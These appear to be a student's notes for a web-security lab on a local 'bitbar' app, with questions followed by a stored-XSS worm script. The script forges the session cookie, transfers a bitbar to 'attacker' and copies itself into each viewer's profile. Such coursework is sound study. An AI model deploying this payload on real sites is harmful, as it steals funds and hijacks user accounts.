TODO
- ensure no race conditions by using async JS for each outbound network request?
	- also in other files

Questions:
- Method?
	- I first tried to directly edit the DOM of profile but diff page so not possible...
	- New approach: send POST request to home page, similar to transfer request

- why do we need to use onload property?

- why are all these other keys showing up in request body?

- why is it called urlencoded when data goes in request body?

- Is there a max amount of chars in profile? 
	- not all chars are showing up

<script>
    // PART 1: steal one bitbar
	var xhr1 = new XMLHttpRequest();
	xhr1.open('POST', 'http://localhost:3000/post_transfer');

	var sessObj = JSON.parse(atob(document.cookie.substring(8)));
	sessObj.account.bitbars = 10;

	// update session ID to reflect changes in session object
	document.cookie = 'session=' + btoa(JSON.stringify(sessObj));

	xhr1.withCredentials = true;
	xhr1.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	
	var args1 = 'destination_username=attacker&quantity=1';

	// -------------------

	// PART 2: change their profile

	// step 1: find text content of the profile we're currently viewing in DOM
	// the form in profile/view.ejs
	// tested & seems correct
	let viewingProfile = document.getElementById('profile').textContent;

	xhr1.onload = function() {
		// step 2: send second post request
		// JS equivalent of hitting the "Update profile" button
		var xhr2 = new XMLHttpRequest();
		xhr2.open('POST', 'http://localhost:3000/set_profile');

		xhr2.withCredentials = true;

		xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

		var reqBody = 'new_profile=' + viewingProfile;
		
		xhr2.send(reqBody);
	}

	xhr1.send(args1);
</script>